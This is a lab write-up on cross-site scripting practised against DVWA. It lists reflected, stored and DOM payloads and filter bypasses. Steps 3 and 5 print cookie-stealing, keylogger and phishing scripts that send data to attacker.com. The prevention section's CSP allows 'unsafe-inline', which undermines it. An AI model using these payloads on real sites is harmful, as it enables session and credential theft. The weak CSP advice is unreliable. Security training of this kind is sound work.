# Section 10: Cross-Site Scripting (XSS) Lab

## Objective
Understand, identify, and prevent Cross-Site Scripting (XSS) vulnerabilities in web applications through hands-on practice and testing.

## Learning Goals
- Learn the three types of XSS attacks (Reflected, Stored, DOM-based)
- Practice identifying XSS vulnerabilities in web applications
- Understand the impact and exploitation of XSS attacks
- Implement proper input validation and output encoding
- Use security tools to detect and test XSS vulnerabilities

## Lab Environment
- **Target Application:** DVWA (Damn Vulnerable Web Application)
- **Tools:** Burp Suite, OWASP ZAP, Browser Developer Tools
- **Operating System:** Windows 10/11 with XAMPP
- **Browser:** Chrome/Firefox with security extensions

## Step-by-Step Procedures

### Step 1: Environment Setup
1. **Configure DVWA:**
   - Set security level to "Low" for initial testing
   - Navigate to XSS (Reflected) module
   - Observe the input form and response handling

2. **Install browser extensions:**
   - XSS Hunter (for payload tracking)
   - NoScript (for testing script blocking)
   - Web Developer Tools

### Step 2: Reflected XSS Testing
1. **Basic XSS payload:**
   ```html
   <script>alert('XSS')</script>
   ```

2. **Advanced payloads:**
   ```html
   <!-- Image-based XSS -->
   <img src="x" onerror="alert('XSS')">
   
   <!-- Event handler XSS -->
   <input type="text" onfocus="alert('XSS')" autofocus>
   
   <!-- SVG-based XSS -->
   <svg onload="alert('XSS')">
   
   <!-- JavaScript URI -->
   <a href="javascript:alert('XSS')">Click me</a>
   ```

3. **Bypass filters:**
   ```html
   <!-- Case variation -->
   <ScRiPt>alert('XSS')</ScRiPt>
   
   <!-- Encoding -->
   <script>alert(String.fromCharCode(88,83,83))</script>
   
   <!-- Double encoding -->
   %253Cscript%253Ealert('XSS')%253C/script%253E
   ```

### Step 3: Stored XSS Testing
1. **Navigate to XSS (Stored) module:**
   - Access the guestbook or comment system
   - Submit malicious payloads that persist

2. **Stored XSS payloads:**
   ```html
   <!-- Cookie theft -->
   <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
   
   <!-- Session hijacking -->
   <script>new Image().src='http://attacker.com/hijack.php?session='+document.cookie</script>
   
   <!-- Keylogger -->
   <script>document.addEventListener('keypress', function(e) { new Image().src='http://attacker.com/keylog.php?key='+e.key; });</script>
   ```

### Step 4: DOM-based XSS Testing
1. **Analyze client-side code:**
   - Use browser developer tools
   - Look for unsafe DOM manipulation
   - Identify sources and sinks

2. **DOM XSS payloads:**
   ```html
   <!-- Fragment identifier -->
   #<script>alert('XSS')</script>
   
   <!-- Hash-based -->
   #<img src=x onerror=alert('XSS')>
   ```

### Step 5: Advanced Exploitation
1. **Session hijacking simulation:**
   ```html
   <script>
   var img = new Image();
   img.src = 'http://attacker.com/steal.php?session=' + document.cookie;
   </script>
   ```

2. **Keylogger implementation:**
   ```html
   <script>
   document.addEventListener('keypress', function(e) {
       var img = new Image();
       img.src = 'http://attacker.com/keylog.php?key=' + e.key + '&page=' + window.location.href;
   });
   </script>
   ```

3. **Phishing simulation:**
   ```html
   <script>
   document.body.innerHTML = '<h1>Session Expired</h1><form action="http://attacker.com/phish.php"><input type="password" placeholder="Enter password"><input type="submit"></form>';
   </script>
   ```

### Step 6: Prevention and Mitigation
1. **Input validation:**
   ```php
   // Validate and sanitize input
   $input = filter_var($_POST['input'], FILTER_SANITIZE_STRING);
   $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
   ```

2. **Output encoding:**
   ```php
   // Context-aware output encoding
   echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
   
   // For HTML attributes
   echo htmlspecialchars($user_input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
   
   // For JavaScript context
   echo json_encode($user_input);
   ```

3. **Content Security Policy (CSP):**
   ```html
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline';">
   ```

### Step 7: Automated Testing
1. **Using OWASP ZAP:**
   - Configure ZAP proxy
   - Scan for XSS vulnerabilities
   - Review scan results and false positives

2. **Using Burp Suite:**
   - Intercept requests
   - Use Intruder for payload testing
   - Analyze responses for XSS indicators

## Key Screenshots
- [Screenshot 1: DVWA XSS module interface]
- [Screenshot 2: Basic XSS alert execution]
- [Screenshot 3: Stored XSS in guestbook]
- [Screenshot 4: Cookie theft simulation]
- [Screenshot 5: Browser developer tools analysis]
- [Screenshot 6: Prevention code implementation]

## Key Takeaways
- **XSS is a client-side vulnerability** that can have severe consequences
- **Three main types:** Reflected, Stored, and DOM-based XSS
- **Context matters:** Different encoding is needed for different contexts
- **Defense in depth:** Multiple layers of protection are essential
- **User education:** Users should be aware of potential XSS attacks

## Attack Impact
- **Session hijacking:** Stealing user session cookies
- **Credential theft:** Capturing login information
- **Malware distribution:** Redirecting users to malicious sites
- **Defacement:** Modifying website content
- **Data theft:** Accessing sensitive user information

## Prevention Strategies
1. **Input validation and sanitization**
2. **Output encoding based on context**
3. **Content Security Policy (CSP)**
4. **HTTP-only cookies**
5. **Regular security testing**
6. **User education and awareness**

## Security Headers
```http
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

## Next Steps
- Practice with different XSS payloads and evasion techniques
- Learn about advanced CSP bypass methods
- Study real-world XSS vulnerabilities and exploits
- Implement comprehensive XSS prevention in web applications

---
*Lab completed: September 10, 2025 | Duration: 2 hours | Status: ✅ Complete*
